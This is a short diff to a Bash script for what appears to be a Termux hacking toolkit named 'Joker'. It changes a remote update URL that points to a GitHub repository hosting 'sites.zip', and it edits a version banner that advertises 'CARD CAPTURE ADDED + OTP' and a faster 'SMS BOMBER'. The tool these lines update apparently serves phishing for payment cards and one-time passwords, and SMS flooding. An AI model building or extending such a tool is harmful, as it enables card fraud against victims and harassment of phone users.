@@ -93,7 +93,7 @@ clear
 sites="https://github.com/sukhdevr898/joker/raw/Pass/sites.zip"
 bash="https://raw.githubusercontent.com/sukhdevr898/joker/Pass/msg"
 msg="https://raw.githubusercontent.com/sukhdevr898/joker/Pass/msg"
-page="https://raw.githubusercontent.com/sukhdevr898/joker/Pass/update2.3"
+page="https://raw.githubusercontent.com/sukhdevr898/joker/Pass/update2.4"
 
 connect="https://raw.githubusercontent.com/sukhdevr898/joker/Pass/msg"
 
@@ -1169,13 +1169,13 @@ clear
 mpv /data/data/com.termux/files/usr/bin/Joker/m/create.wav > /dev/null 2>1&
 echo -e "\e[96m        |=====================================================|" | pv -qL 20
 echo -e "\e[96m                                                             " | pv -qL 20
-echo -e "\e[96m                       WHATS NEW IN JOKER 2.2" | pv -qL 20
+echo -e "\e[96m                       WHATS NEW IN JOKER 2.4" | pv -qL 20
 echo -e "\e[96m                • CARD CAPTURE ADDED + OTP              " | pv -qL 20
 echo -e "\e[96m                • LITE SIZE                        " | pv -qL 10
 echo -e "\e[96m                • BUG FIXED                             " | pv -qL  10
 echo -e "\e[96m                • CRASH FIXED                          " | pv -qL 10
 echo -e "\e[96m                • NEW UI  ADDED                             " | pv -qL 10
-echo -e "\e[96m                • SMS BOMBER                             " | pv -qL  10
+echo -e "\e[96m                • SMS BOMBER (Speed)                            " | pv -qL  10
 echo -e "\e[96m        |=====================================================|" | pv -qL 20
 sleep 8.0
 choose
